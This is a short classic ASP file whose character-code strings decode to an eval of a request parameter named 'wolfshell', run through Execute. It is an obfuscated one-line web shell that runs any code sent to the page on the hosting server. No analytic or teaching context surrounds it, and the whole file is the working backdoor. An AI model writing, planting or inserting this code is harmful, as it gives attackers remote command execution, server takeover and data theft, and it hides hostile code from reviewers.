<%
Dim s_1a2b, s_3c4d, s_5e6f, s_7g8h, s_9i0j
s_1a2b = Chr(101) & Chr(118) & Chr(97) & Chr(108)
s_3c4d = Chr(114) & Chr(101) & Chr(113) & Chr(117) & Chr(101) & Chr(115) & Chr(116)
s_5e6f = Chr(119) & Chr(111) & Chr(108) & Chr(102) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
s_7g8h = s_1a2b & "(" & s_3c4d & "(""" & s_5e6f & """))"
Execute(s_7g8h)
%>